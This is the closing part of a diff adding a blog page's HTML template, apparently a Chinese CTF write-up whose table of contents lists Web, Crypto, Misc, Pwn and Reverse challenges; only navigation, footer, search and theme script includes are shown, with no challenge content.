+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DEAD-OR-ALIVE"><span class="nav-text">DEAD OR ALIVE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%A0%E9%81%93%E8%8F%9C%E5%91%80"><span class="nav-text">几道菜呀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#codemaster"><span class="nav-text">codemaster</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%A8%A1%E8%BF%90%E7%AE%97"><span class="nav-text">简单的模运算</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%A7ping%E7%89%B9ping"><span class="nav-text">大ping特ping</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BC%A0%E6%A0%87%E4%B8%8D%E5%A6%99%E9%A2%98"><span class="nav-text">鼠标不妙题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pwn"><span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#book"><span class="nav-text">book</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#magic-fmt"><span class="nav-text">magic_fmt</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse"><span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#easy-choice"><span class="nav-text">easy_choice</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2023</span>&nbsp;-&nbsp;2025
+        
+            &nbsp;</i>&nbsp;&nbsp;<a href="/">C3ngH</a>
+        
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">66.5k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DEAD-OR-ALIVE"><span class="nav-text">DEAD OR ALIVE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%A0%E9%81%93%E8%8F%9C%E5%91%80"><span class="nav-text">几道菜呀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#codemaster"><span class="nav-text">codemaster</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%A8%A1%E8%BF%90%E7%AE%97"><span class="nav-text">简单的模运算</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%A7ping%E7%89%B9ping"><span class="nav-text">大ping特ping</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BC%A0%E6%A0%87%E4%B8%8D%E5%A6%99%E9%A2%98"><span class="nav-text">鼠标不妙题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pwn"><span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#book"><span class="nav-text">book</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#magic-fmt"><span class="nav-text">magic_fmt</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse"><span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#easy-choice"><span class="nav-text">easy_choice</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
